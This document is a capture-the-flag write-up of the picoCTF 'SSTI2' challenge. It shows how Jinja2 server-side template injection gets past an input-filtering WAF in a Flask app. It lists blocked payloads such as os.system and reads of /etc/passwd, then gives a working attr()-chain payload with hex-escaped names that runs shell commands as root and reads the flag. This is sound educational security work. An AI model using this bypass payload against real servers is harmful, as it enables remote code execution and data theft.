# **Write-Up: SSTI2 (Server-Side Template Injection - Filter Bypass)**  

## **Challenge Overview**  

### **Challenge Name:** SSTI2  
### **Category:** Web Exploitation  
### **Description:**  

The challenge presents a web application where users can post announcements. According to the description, the developer attempted to secure the application by **sanitizing input** to remove potentially dangerous characters. Despite this, our goal is to identify a way to bypass the filtering mechanisms and exploit **Server-Side Template Injection (SSTI)** to execute commands on the server and retrieve the flag.  

---

## **Step 1: Identifying SSTI Vulnerability**  

### **Initial Testing for SSTI Execution**  

To determine if the application was vulnerable to SSTI, we started by injecting a basic mathematical expression:  

```
{{ 7 * 7 }}
```  

If the input is being processed by a template engine, the expected output is `49`.  

**Result:**  

```
49
```  

This confirms that the input is being interpreted as a template expression, meaning the application is vulnerable to **SSTI**.

Next, we tested whether loops could be executed:  

```
{% for item in ("a", "b", "c") %}{{ item }}{% endfor %}
```  

**Result:**  

```
abc
```  

This indicates that **loop constructs** are also functional, but further exploitation attempts were met with restrictions.

---

## **Step 2: Analyzing Web Application Firewall (WAF) Protections**  

Upon further testing, we identified that the application implemented a **Web Application Firewall (WAF)** to block common SSTI attack payloads. The WAF detected and blocked several typical techniques used to access sensitive objects and execute system commands.  

### **Blocked Techniques**  

| Attempted Payload | Result |
| --- | --- |
| `{{ self }}` | `<TemplateReference None>` (Limited context) |
| `{{ config.items() }}` | Blocked |
| `{{ request.application }}` | Blocked |
| `{{ os.system('ls') }}` | Blocked |
| `{{ subprocess.Popen('ls') }}` | Blocked |
| `{{ open('/etc/passwd').read() }}` | Blocked |
| `{{ getattr(1, "__class__") }}` | Blocked |
| `{{ __import__("os").system("ls") }}` | Blocked |
| `{{ request.__globals__['os'].system("ls") }}` | Blocked |
| `{{ __import__('base64').b64decode(...) }}` | Blocked |

### **Observations:**  

- **Direct access to attributes (`.`) was blocked**, preventing calls like `__class__`, `__dict__`, `mro`, or `subclasses()`.  
- **Common SSTI exploit vectors (`config`, `globals()`, `builtins`) were restricted.**  
- **Direct function execution (`exec()`, `eval()`, `os.system()`, `subprocess.Popen()`) was prevented.**  
- **Obfuscation attempts using Base64, Hex, and URL Encoding (`%XX`) were detected and blocked.**  

Given these restrictions, it was necessary to find an alternative way to access **Python’s built-in functions** without directly invoking `__globals__` or `__builtins__`.

---

## **Step 3: Developing a WAF Bypass Strategy**  

To achieve **remote code execution (RCE)**, we needed to:  

1. **Access Python built-ins without using `globals()` or `builtins`.**  
2. **Import and execute system commands without explicitly calling `import` or `os.system()`.**  

We determined that an **attribute-based filter bypass** could be used to circumvent the WAF’s restrictions.

---

## **Step 4: Crafting the Final Payload**  

The following payload successfully bypassed the WAF and executed system commands:  

```
{{ request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')() }}
```  

**Result:**  

```
uid=0(root) gid=0(root) groups=0(root)
```  

This confirmed that we successfully achieved **RCE (Remote Code Execution)**.

---

## **Step 5: Understanding the Bypass Mechanism**  

### **Accessing Flask Application Context**  
- `request|attr('application')` retrieves the Flask **application context**.  
- The Flask application context contains references to global objects, allowing access to sensitive attributes.  

### **Bypassing `globals()` Restriction**  
- `attr('\x5f\x5fglobals\x5f\x5f')` uses hexadecimal encoding for `__globals__`, avoiding WAF detection.  
- `attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')` safely retrieves `__builtins__`.  

### **Importing `os` Without Using `import`**  
- `attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')` dynamically imports the `os` module without triggering WAF rules.  

### **Executing Commands Without `system()`**  
- `attr('popen')('id')|attr('read')()` executes `os.popen("id")`, an alternative to `os.system()`, which was blocked.  

This step-by-step approach allowed us to execute arbitrary system commands while completely bypassing the WAF.

---

## **Step 6: Extracting the Flag**  

### **Listing Files on the Server**  

To locate the flag file, we executed the following commands:  

```
{{ request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls -la /')|attr('read')() }}
```

```
{{ request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('find / -name flag* 2>/dev/null')|attr('read')() }}
```

This revealed the flag’s location:  

```
/challenge/flag
```

---

### **Reading the Flag File**  

```
{{ request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat /challenge/flag')|attr('read')() }}
```

**Result:**  

```
picoCTF{sst1_f1lt3r_byp4ss_060a5eb0}
